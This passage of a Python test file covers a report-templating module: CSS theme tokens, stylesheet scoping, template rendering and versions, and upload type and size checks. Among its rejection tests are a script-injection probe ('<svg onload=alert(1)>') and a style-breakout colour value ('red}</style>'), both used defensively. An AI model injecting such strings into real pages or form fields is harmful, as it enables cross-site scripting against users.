    tokens = rt.theme_tokens([":root{--ink:#000;--gold:rgb(1, 2, 3);--nope:#fff;"
                              "--pos:url(#x);--neg:var(--x)} .x{--slate:#fff}"])
    assert tokens == {"ink": "#000", "gold": "rgb(1, 2, 3)"}


def test_our_block_stylesheet_is_scoped_and_never_styles_the_template():
    css = rt.block_stylesheet()
    src = rt._css_preprocess(css)
    stmts, _ = rt._css_parse(rt._css_tokens(src))

    def preludes(items):
        for s in items:
            sig = rt._significant(s.head)
            if s.block is None:
                continue
            if sig and sig[0].kind == "at":
                if sig[0].value.lower() in ("media", "supports"):
                    yield from preludes(s.block)
                else:
                    assert sig[0].value.lower() in ("font-face", "keyframes")
                continue
            yield "".join(src[t.start:t.end] for t in s.head if t.kind != "comment")

    found = list(preludes(stmts))
    assert found
    for prelude in found:
        for selector in prelude.split(","):
            assert selector.strip().startswith(".mrb"), selector
    assert "@page" not in css


def test_the_data_gaps_note_and_footer_are_appended_when_left_out(golden):
    out = _render("<p>{{total_spend}}</p>", golden)
    gaps = vrr.SECTION_REGISTRY["data_gaps"].title.replace("&", "&amp;")
    assert out.count(gaps) == 1 and out.count("<footer>") == 1
    assert out.index(gaps) < out.index("<footer>")


def test_the_data_gaps_note_and_footer_are_not_doubled_when_present(golden):
    out = _render("<div>{{band:footer}}</div><p>{{total_spend}}</p><div>{{note:data_gaps}}</div>",
                  golden)
    gaps = vrr.SECTION_REGISTRY["data_gaps"].title.replace("&", "&amp;")
    assert out.count(gaps) == 1 and out.count("<footer>") == 1
    assert out.index("<footer>") < out.index(gaps)              # the template's order kept


def test_the_rendered_document_is_self_contained(golden):
    out = rt.render_html_template(_check(rt.starter_html()).sanitized_html, golden)
    assert_inert(out)
    assert out.count('class="mrb"') == sum(p.is_block for p in rt.PLACEHOLDERS.values())


# --- render_with_template ---------------------------------------------------------------

@pytest.mark.parametrize("version", [
    runs.builtin_template(),
    {"kind": "builtin"},                        # the build's template record
    {"id": "builtin", "builtin": True, "source_kind": None, "spec": None, "html": None},
])
def test_builtin_is_the_default_renderer_byte_for_byte(golden, version):
    assert rt.render_with_template(golden, version) == vrr.render(golden)


def test_a_spec_version_renders_its_layout(golden):
    spec = vrr.layout_to_dict(vrr.DEFAULT_LAYOUT)
    spec["sections"] = [s for s in spec["sections"] if s["type"] != "channel_mix"]
    out = rt.render_with_template(golden, {"builtin": False, "source_kind": "pdf", "spec": spec})
    assert out == vrr.render(golden, vrr.layout_from_dict(spec))
    assert "Spend &amp; projected revenue by channel" not in out


def test_a_spec_without_data_gaps_or_footer_gets_them_appended(golden):
    spec = {"sections": [{"type": "header"}, {"type": "vendor_scorecard"}]}
    out = rt.render_with_template(golden, {"source_kind": "image", "spec": spec})
    gaps = vrr.SECTION_REGISTRY["data_gaps"].title.replace("&", "&amp;")
    assert out.count(gaps) == 1 and out.count("<footer>") == 1


def test_an_html_version_renders_through_the_html_template(golden):
    html_text = _check(_page("<p>{{total_spend}}</p>")).sanitized_html
    version = {"builtin": False, "source_kind": "html", "html": html_text, "spec": None}
    assert rt.render_with_template(golden, version) == rt.render_html_template(html_text, golden)


@pytest.mark.parametrize("version, fragment", [
    ({"source_kind": "pdf", "spec": {"sections": [{"type": "pie_chart"}]}}, "pie_chart"),
    ({"source_kind": "pdf", "spec": {"sections": [{"title": "no type"}]}},
     "must be an object with a 'type'"),
    ({"source_kind": "builder", "spec": {"sections": [
        {"type": "demos_by_vendor", "options": {"min_booked": "lots"}}]}}, "wrong type"),
    ({"source_kind": "builder", "spec": {"theme": {"colors": {"ink": "red}</style>"}},
                                         "sections": [{"type": "header"}]}}, "must be a colour"),
    ({"source_kind": "html", "html": None}, "no HTML"),
    ({"source_kind": "html", "html": "<p>{{nope}}</p>"}, "{{nope}}"),
    ({"source_kind": "pdf", "spec": None}, "no layout"),
    ({"builtin": False}, "no layout"),
    (None, "No template version"),
])
def test_a_template_failure_raises_a_presentable_reason_and_never_falls_back(
        golden, version, fragment):
    with pytest.raises(rt.TemplateRenderError) as err:
        rt.render_with_template(golden, version)
    assert fragment in err.value.reason


def test_a_report_from_another_generator_is_not_blamed_on_the_template(golden):
    other = {**golden, "generator": "something-else/9"}
    with pytest.raises(ValueError) as err:
        rt.render_with_template(other, {"source_kind": "html", "html": "<p>{{title}}</p>"})
    assert not isinstance(err.value, rt.TemplateRenderError)


# --- the console's view of a workspace's templates ---------------------------------------

def test_the_switch_is_off_unless_it_says_on(monkeypatch):
    monkeypatch.delenv("MR_REPORT_TEMPLATES", raising=False)
    assert rt.enabled() is False
    for value, on in (("1", True), ("on", True), ("TRUE", True), ("0", False), ("yes", False)):
        monkeypatch.setenv("MR_REPORT_TEMPLATES", value)
        assert rt.enabled() is on, value


@pytest.mark.parametrize("version, kind", [
    (None, "builtin"), ({"builtin": True}, "builtin"), ({"kind": "builtin"}, "builtin"),
    ({"source_kind": "html", "html": "x"}, "html"), ({"source_kind": "pdf", "spec": {}}, "layout"),
    ({"source_kind": "image", "spec": {}}, "layout"), ({"source_kind": "builder", "spec": {}}, "layout"),
])
def test_every_version_is_one_of_three_kinds(version, kind):
    assert rt.version_kind(version) == kind
    ref = rt.template_ref(version)
    assert ref["kind"] == kind and set(ref) == {"kind", "number", "id"}


def test_the_listing_shows_content_versions_and_who_last_set_each(tmp_path, monkeypatch):
    monkeypatch.setenv("MR_RUNS_DIR", str(tmp_path))
    v1 = runs.save_template_version("ws", uploaded_by="ann@x.com", source_kind="pdf",
                                    spec={"sections": []}, filename="sample.pdf")
    v2 = runs.save_template_version("ws", uploaded_by="bob@x.com", source_kind="html",
                                    html="<p>{{total_spend}}</p>")
    back = runs.revert_template("ws", v1["id"], set_by="cat@x.com")
    listed = rt.listing(runs.list_template_versions("ws"))
    active = listed["active"]
    assert active == {"id": v1["id"], "kind": "layout", "number": 1, "source_kind": "pdf",
                      "filename": "sample.pdf", "created_by": "ann@x.com",
                      "created_by_name": "ann@x.com", "created_at": v1["created_at"],
                      "set_by": "cat@x.com", "set_by_name": "cat@x.com",
                      "set_at": back["set_at"]}
    assert [(v["number"], v["kind"], v["active"]) for v in listed["versions"]] == [
        (2, "html", False), (1, "layout", True)]
    assert listed["versions"][1]["set_by"] == "cat@x.com"        # the latest activation
    assert listed["versions"][0]["set_by"] == "bob@x.com"
    runs.revert_template("ws", runs.BUILTIN_TEMPLATE_ID, set_by="dan@x.com")
    listed = rt.listing(runs.list_template_versions("ws"))
    assert listed["active"]["kind"] == "builtin" and listed["active"]["id"] == "builtin"
    assert listed["active"]["set_by"] == "dan@x.com"
    assert [v["active"] for v in listed["versions"]] == [False, False]


def test_every_placeholder_has_a_human_title():
    for p in rt.PLACEHOLDERS.values():
        assert p.title, p.name
        if p.is_block:
            assert p.title == vrr.SECTION_REGISTRY[p.section_type].title
    assert rt.PLACEHOLDERS["chart:demos_by_vendor"].title == "Demos booked vs. completed"
    assert {e["title"] for e in rt.vocabulary()} >= {"Vendor scorecard", "Total Spend"}


def test_a_workspace_with_no_template_lists_the_builtin_and_no_versions():
    assert rt.listing([]) == {"active": rt.summarize(None), "versions": []}
    assert rt.summarize(None)["kind"] == "builtin"


# --- the starter template --------------------------------------------------------------

def test_the_starter_passes_check_with_zero_errors_and_uses_every_block():
    result = _check(rt.starter_html())
    assert result.errors == () and result.can_save
    blocks = {p.token for p in rt.PLACEHOLDERS.values() if p.is_block}
    scalars = {p.token for p in rt.PLACEHOLDERS.values() if not p.is_block}
    assert blocks <= set(result.placeholders_used)
    assert scalars <= set(result.placeholders_used)
    removed = {k: v for k, v in result.removed.items() if v}
    assert set(removed) <= {"comments"}                          # only its documentation
    assert _check(result.sanitized_html).sanitized_html == result.sanitized_html


def test_the_starter_follows_the_built_in_reports_order():
    """Header band first and footer last, as the built-in report draws them: the
    dark band mid-page was the browser check's finding."""
    import re

    starter = rt.starter_html()
    body = starter[starter.index("<body>"):]
    blocks = re.findall(r"\{\{([a-z]+:[a-z_]+)\}\}", body)
    types = [rt.PLACEHOLDERS[b].section_type for b in blocks]
    assert types[0] == "header" and types[-1] == "footer"
    assert types[-2] == "data_gaps"
    assert sorted(types) == sorted(vrr.SECTION_REGISTRY)            # every block, once
    built_in = [s.type for s in vrr.DEFAULT_LAYOUT.sections]
    assert [t for t in types if t in built_in] == built_in          # the built-in's order
    assert body.index("{{band:header}}") < body.index("Key figures") < body.index(
        "{{tiles:portfolio_glance}}")
    assert rt.check_html(starter.encode()).errors == ()


def test_the_starter_order_puts_an_unknown_section_in_the_body():
    order = rt._starter_block_order(["footer", "zz_new", "header", "data_gaps", "standouts"])
    assert order[0] == "header" and order[-1] == "footer"
    assert order.index("zz_new") < order.index("data_gaps")


def test_the_starter_documents_every_theme_token():
    starter = rt.starter_html()
    for token in vrr.PALETTE:
        assert f"--{token}:" in starter


# --- upload sniffing --------------------------------------------------------------------

def _png(width: int, height: int, pad: int = 0) -> bytes:
    ihdr = struct.pack(">II", width, height) + b"\x08\x02\x00\x00\x00"
    chunk = struct.pack(">I", 13) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    return b"\x89PNG\r\n\x1a\n" + chunk + b"\x00" * pad


def _jpeg(width: int, height: int, *, sof: int = 0xC0, pad: int = 0) -> bytes:
    app0 = b"\xff\xe0" + struct.pack(">H", 16) + b"JFIF\x00" + b"\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    frame = bytes([0xFF, sof]) + struct.pack(">HBHHB", 17, 8, height, width, 3) + b"\x01\x22\x00" * 3
    return b"\xff\xd8" + app0 + frame + b"\x00" * pad + b"\xff\xd9"


def test_a_pdf_named_html_is_a_pdf(tmp_path):
    path = tmp_path / "sample report.html"
    path.write_bytes(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj<<>>endobj\n%%EOF")
    sniffed = rt.sniff_upload(path.read_bytes())
    assert (sniffed.kind, sniffed.media_type) == ("pdf", "application/pdf")


def test_html_containing_a_pdf_marker_is_still_html():
    sniffed = rt.sniff_upload(b"\xef\xbb\xbf  <!DOCTYPE html><p>%PDF-1.7 {{total_spend}}</p>")
    assert sniffed.kind == "html"


def test_png_and_jpeg_are_read_from_their_headers():
    png = rt.sniff_upload(_png(1200, 800))
    assert (png.kind, png.width, png.height) == ("png", 1200, 800)
    jpg = rt.sniff_upload(_jpeg(640, 480))
    assert (jpg.kind, jpg.width, jpg.height) == ("jpeg", 640, 480)
    progressive = rt.sniff_upload(_jpeg(300, 200, sof=0xC2))
    assert (progressive.width, progressive.height) == (300, 200)


_REFUSED_UPLOADS = [
    (_png(4097, 10), "4096 pixels"),
    (_jpeg(10, 4097), "4096 pixels"),
    (_png(0, 10), "no size"),
    (_png(100, 100, pad=rt.IMAGE_MAX_BYTES), "over the 5 MB limit for images"),
    (_jpeg(100, 100, pad=rt.IMAGE_MAX_BYTES), "over the 5 MB limit for images"),
    (b"\x89PNG\r\n\x1a\n\x00\x00", "damaged"),
    (b"\xff\xd8\xff\xe0\x00\x10JFIF", "damaged"),
    (b"%PDF-1.7" + b"\x00" * rt.PDF_MAX_BYTES, "over the 10 MB upload limit"),
    (b"<p>{{total_spend}}</p>" + b" " * rt.HTML_MAX_BYTES, "512 KB"),
    (b"", "empty"),
    (b"GIF89a\x01\x00\x01\x00", "GIF"),
    (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "WebP"),
    (b"PK\x03\x04\x14\x00", "zip or Office"),
    (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>', "SVG"),
    (b"<svg onload=alert(1)>", "SVG"),
    (b"\xff\xfe<\x00h\x00t\x00m\x00l\x00>\x00", "isn't a PDF, PNG, JPEG or HTML"),
    (b"just some text, no markup", "isn't a PDF, PNG, JPEG or HTML"),
    (b"\x00\x01\x02\x03binary", "isn't a PDF, PNG, JPEG or HTML"),
]


@pytest.mark.parametrize("data, fragment", _REFUSED_UPLOADS,
                         ids=[f"{i}-{c[1][:24]}" for i, c in enumerate(_REFUSED_UPLOADS)])
def test_anything_else_or_too_big_is_refused_with_a_reason(data, fragment):
    with pytest.raises(rt.UploadRejected) as err:
        rt.sniff_upload(data)
    assert fragment in err.value.reason


def test_the_size_caps_are_the_agreed_ones():
    assert rt.PDF_MAX_BYTES == 10 * 1024 * 1024
    assert rt.IMAGE_MAX_BYTES == 5 * 1024 * 1024
    assert rt.HTML_MAX_BYTES == 512 * 1024
    assert rt.IMAGE_MAX_SIDE == 4096
    assert rt.sniff_upload(b"%PDF-1.4" + b"\x00" * (rt.PDF_MAX_BYTES - 8)).kind == "pdf"
    assert rt.sniff_upload(_png(4096, 4096)).kind == "png"
